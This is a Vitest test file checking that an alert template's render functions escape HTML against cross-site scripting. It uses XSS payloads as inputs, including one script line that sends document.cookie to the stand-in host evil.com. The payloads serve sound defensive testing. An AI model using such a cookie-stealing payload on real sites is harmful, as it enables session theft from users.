import { describe, it, expect } from 'vitest'
import { renderAlert, renderErrorAlert, renderSuccessAlert } from '../../templates/alert.template'

describe('renderAlert XSS prevention', () => {
  it('should escape HTML in message to prevent XSS', () => {
    const xssPayload = '<img src=x onerror="alert(\'XSS\')">'
    const result = renderAlert({ type: 'error', message: xssPayload })

    expect(result).not.toContain(xssPayload)
    expect(result).toContain('&lt;img src=x onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;')
  })

  it('should escape script tags in message', () => {
    const result = renderAlert({
      type: 'error',
      message: '<script>document.location="https://evil.com?c="+document.cookie</script>',
    })

    expect(result).not.toContain('<script>')
    expect(result).toContain('&lt;script&gt;')
  })

  it('should escape HTML in title', () => {
    const result = renderAlert({
      type: 'error',
      title: '<svg onload=alert(1)>',
      message: 'safe message',
    })

    expect(result).not.toContain('<svg onload=alert(1)>')
    expect(result).toContain('&lt;svg onload=alert(1)&gt;')
  })

  it('should render safe messages correctly', () => {
    const result = renderAlert({ type: 'success', message: 'Login successful' })

    expect(result).toContain('Login successful')
  })

  it('should escape messages via renderErrorAlert helper', () => {
    const result = renderErrorAlert('<script>alert(1)</script>')

    expect(result).not.toContain('<script>')
    expect(result).toContain('&lt;script&gt;alert(1)&lt;/script&gt;')
  })

  it('should escape messages via renderSuccessAlert helper', () => {
    const result = renderSuccessAlert('<img src=x onerror=alert(1)>')

    expect(result).not.toContain('<img src=x')
    expect(result).toContain('&lt;img src=x onerror=alert(1)&gt;')
  })

  it('should escape ampersands in message', () => {
    const result = renderAlert({ type: 'info', message: 'Tom & Jerry' })

    expect(result).toContain('Tom &amp; Jerry')
  })
})
